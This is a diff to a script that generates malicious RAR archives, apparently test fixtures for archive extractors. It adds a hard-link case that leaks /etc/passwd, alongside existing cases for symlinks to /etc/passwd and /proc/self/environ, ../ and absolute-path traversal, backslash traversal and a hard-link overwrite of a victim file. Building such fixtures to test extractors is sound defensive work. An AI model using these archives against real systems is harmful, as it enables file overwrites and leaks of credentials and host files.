@@ -108,22 +108,30 @@ write("hardlink-slip.rar",
       hardlink("hl", "/tmp/VICTIM.txt"),           # hard-link out to an existing file
       regfile("hl", b"PWNED"))                     # write through -> overwrites the victim
 
-# 6) exfiltration: symlinks that survive extraction and leak host files when read
+# 6) exfiltration via symlink: symlinks that survive extraction and leak host
+#    files when the output is later served or read.
 write("exfil-slip.rar",
       sym("passwd", "/etc/passwd", is_dir=False),
       sym("env", "/proc/self/environ", is_dir=False),
       sym("root", "/", is_dir=True))
 
-# 7) plain ../ path traversal
+# 7) exfiltration via hard link: a lone hard link, no second entry and no
+#    overwrite. The extracted name shares the target's inode, so reading it back
+#    leaks the file even where symlinks are refused. Needs the same filesystem as
+#    the target and (with Linux protected_hardlinks) an extractor that owns or can
+#    write it, in practice one running as root.
+write("hardlink-exfil-slip.rar", hardlink("passwd", "/etc/passwd"))
+
+# 8) plain ../ path traversal
 write("dotdot-slip.rar", regfile("../../../../../../tmp/PWNED.txt", b"x"))
 
-# 8) absolute path (extractor that doesn't strip a leading "/")
+# 9) absolute path (extractor that doesn't strip a leading "/")
 write("abs-slip.rar", regfile("/tmp/PWNED.txt", b"x"))
 
-# 9) Windows backslash traversal (sanitizer that only splits on "/")
+# 10) Windows backslash traversal (sanitizer that only splits on "/")
 write("backslash-slip.rar", regfile("..\\..\\..\\..\\..\\..\\tmp\\PWNED.txt", b"x"))
 
-# 10) read-only files: 0444 (Unix) and the DOS read-only attribute. `rm` prompts
+# 11) read-only files: 0444 (Unix) and the DOS read-only attribute. `rm` prompts
 #     "remove write-protected file?" and needs -f; on Windows clear the attr first.
 write("readonly-slip.rar",
       regfile("readonly-unix.txt", b"can't rm me without -f\n", attrs=0o100444),
